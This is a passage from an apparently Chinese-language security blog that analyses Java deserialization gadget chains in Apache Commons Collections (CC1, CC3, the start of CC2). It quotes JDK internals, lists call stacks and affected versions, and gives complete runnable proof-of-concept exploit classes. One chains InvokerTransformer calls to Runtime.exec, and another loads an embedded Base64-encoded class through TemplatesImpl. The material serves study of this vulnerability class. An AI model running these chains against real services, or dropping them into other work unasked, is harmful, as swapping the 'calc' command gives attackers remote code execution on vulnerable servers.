class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    <span class="hljs-comment">//构造函数，可传入 LazyMap</span><br>    AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        <span class="hljs-built_in">this</span>.type = var1;<br>        <span class="hljs-built_in">this</span>.memberValues = var2;<br>    &#125;<br><br>    <span class="hljs-comment">//利用 invoke 方法可实现调用 LazyMap#get</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.get(var4);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>AnnotationInvocationHandler 类 readObject 方法代码：关键点在 this.memberValues.entrySet() ，这里我们可以为 memberValues 传入一个代理对象。通过 java 的动态代理机制，使其最终触发 AnnotationInvocationHandler 类的 invoke 方法，从而实现触发 LazyMap.get()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        var1.defaultReadObject();<br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-built_in">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.memberTypes();<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> (Entry)var4.next();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (String)var5.getKey();<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>测试环境</strong>：3.1-3.2.1 jdk版本小于u71</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Apache_Common_Collections.cc_1_7;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//Transformer数组</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//ChainedTransformer实例</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//LazyMap实例</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">uselessMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//反射获取AnnotationInvocationHandler实例</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>            constructor.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);<br><br>            <span class="hljs-comment">//动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke           </span><br>            <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);<br><br>            <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler1</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mapProxy);<br><br>            <span class="hljs-comment">//序列化</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>            oos.writeObject(handler1);<br>            oos.flush();<br>            oos.close();<br><br>            <span class="hljs-comment">//测试反序列化</span><br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>            ois.readObject();<br>            ois.close();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">-&gt;AnnotationInvocationHandler.readObject()<br>      -&gt;mapProxy.entrySet().iterator()  <span class="hljs-comment">//动态代理类</span><br>          -&gt;AnnotationInvocationHandler.invoke()<br>            -&gt;LazyMap.get()<br>                -&gt;ChainedTransformer.transform()<br>                -&gt;ConstantTransformer.transform()<br>                    -&gt;InvokerTransformer.transform()<br>                    -&gt;…………<br></code></pre></td></tr></table></figure><h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk7u21及以前</p><p>对 CC1 进行了一些修改。引入了 TemplatesImpl 来加载字节码，去掉了 InvokerTransformer ，引入了 InstantiateTransformer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections3</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//字节码</span><br>            <span class="hljs-type">byte</span>[] code = Base64.decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);<br><br>            <span class="hljs-comment">//反射设置 Field</span><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>            setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>            <span class="hljs-comment">//Transformer数组</span><br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>            &#125;;<br><br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>            <span class="hljs-comment">//LazyMap实例</span><br>            <span class="hljs-type">Map</span> <span class="hljs-variable">uselessMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(uselessMap,chainedTransformer);<br><br>            <span class="hljs-comment">//反射获取AnnotationInvocationHandler实例</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>            constructor.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, lazyMap);<br><br>            <span class="hljs-comment">//动态代理类，为了触发 AnnotationInvocationHandler#invoke</span><br>            <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);<br><br>            <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler1</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, mapProxy);<br><br><br>            <span class="hljs-comment">//序列化</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>            oos.writeObject(handler1);<br>            oos.flush();<br>            oos.close();<br><br>            <span class="hljs-comment">//测试反序列化</span><br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>            ois.readObject();<br>            ois.close();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-comment">//反射设置 Field</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(object, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">-&gt;AnnotationInvocationHandler.readObject()<br>      -&gt;mapProxy.entrySet().iterator()  <span class="hljs-comment">//动态代理类</span><br>          -&gt;AnnotationInvocationHandler.invoke()<br>            -&gt;LazyMap.get()<br>                -&gt;ChainedTransformer.transform()<br>                    -&gt;ConstantTransformer.transform()<br>                        -&gt;InstantiateTransformer.transform()<br>                            -&gt;TrAXFilter.TrAXFilter()<br>                                -&gt;TemplatesImpl.newTransformer()<br>                                    -&gt;…………<br></code></pre></td></tr></table></figure><h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><p>利用条件比较苛刻：首先 CommonsCollections3 中无法使用，因为其 TransformingComparator 无法序列化。其次只有 CommonsCollections4-4.0 可以使用，因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p><p>这里需要引入两个新的类，首先是 PriorityQueue 部分关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> Object[] queue;   <span class="hljs-comment">//关键点，可以传入 TemplatesImpl</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Comparator&lt;? <span class="hljs-built_in">super</span> E&gt; comparator;     <span class="hljs-comment">//关键点可以反射设置我们自己的 Comparator</span><br><br>    <span class="hljs-comment">//关键点，反序列化时字段执行的 readObject</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//关键点，调用 heapify() 排序</span><br>        heapify();<br>    &#125;<br><br>    <span class="hljs-comment">//跟进 heapify() 方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br><br>    <span class="hljs-comment">//跟进 siftDown 方法，如果 comparator 不为空，调用 siftDownUsingComparator</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>            siftDownUsingComparator(k, x);<br>        <span class="hljs-keyword">else</span><br>            siftDownComparable(k, x);<br>    &#125;<br><br>    <span class="hljs-comment">//跟进 siftDownUsingComparator 方法，可以看到这里调用了我们自定义的 Comparator</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">half</span> <span class="hljs-operator">=</span> size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> queue[child];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)    <span class="hljs-comment">//关键点</span><br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到其反序列化时调用 readObject 方法，然后最终会调用 我们自定义的 Comparator 的 compare 方法</p><h4 id="自定义Comparator"><a href="#自定义Comparator" class="headerlink" title="自定义Comparator"></a>自定义Comparator</h4><p>借助 TransformingComparator 类，可以看到其 Comparator 方法中会调用 this.transformer.transform()。这是一个关键点，毕竟拿到 Transformer.transform() 就什么都好说。</p><figure class="highlight 